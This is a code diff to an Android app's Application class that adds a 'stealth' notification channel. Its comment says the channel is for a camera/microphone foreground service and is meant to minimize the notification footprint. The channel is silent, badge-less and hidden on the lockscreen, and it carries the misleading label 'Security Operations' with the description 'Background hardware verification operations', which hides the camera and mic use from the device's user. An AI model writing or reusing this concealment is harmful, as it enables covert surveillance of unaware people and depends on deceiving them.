@@ -27,6 +27,8 @@ class PasaApp : Application(), Configuration.Provider {
         private const val TAG = "PASA_App"
         const val GUARDIAN_CHANNEL_ID = "pasa_guardian_channel"
         const val ALERT_CHANNEL_ID = "pasa_alerts_channel"
+        /** Silent, badge-less channel used for camera/mic foreground service — minimizes notification footprint */
+        const val STEALTH_CHANNEL_ID = "pasa_stealth_ops_channel"
     }
 
     override fun onCreate() {
@@ -70,6 +72,19 @@ class PasaApp : Application(), Configuration.Provider {
 
         nm.createNotificationChannel(guardianChannel)
         nm.createNotificationChannel(alertChannel)
+
+        val stealthChannel = NotificationChannel(
+            STEALTH_CHANNEL_ID,
+            "Security Operations",
+            NotificationManager.IMPORTANCE_MIN
+        ).apply {
+            description = "Background hardware verification operations"
+            setShowBadge(false)
+            enableVibration(false)
+            setSound(null, null)
+            lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
+        }
+        nm.createNotificationChannel(stealthChannel)
         Log.d(TAG, "Notification channels registered")
     }
 
